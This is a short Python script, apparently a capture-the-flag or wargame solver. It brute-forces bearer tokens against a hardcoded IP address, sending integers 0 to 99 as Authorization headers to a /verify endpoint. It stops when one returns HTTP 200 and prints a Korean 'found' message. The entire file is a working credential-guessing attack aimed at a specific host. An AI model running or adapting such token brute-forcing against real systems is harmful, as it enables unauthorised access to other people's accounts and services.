from modules.token import tokenAnalyze
import requests

def getResponse(token):
    url = 'http://112.151.179.200:7474/verify'
    parameter = {'Authorization' : 'Bearer {}'.format(token)}
    print(parameter)

    r = requests.get(url, headers=parameter)
    print('Status Code : {} / Response Message : {}'.format(r.status_code, r.content.decode()))
    if r.status_code == 200:
        print('찾았습니다 : {}'.format(token))
        import sys
        sys.exit()

for i in range(100):
    getResponse(i)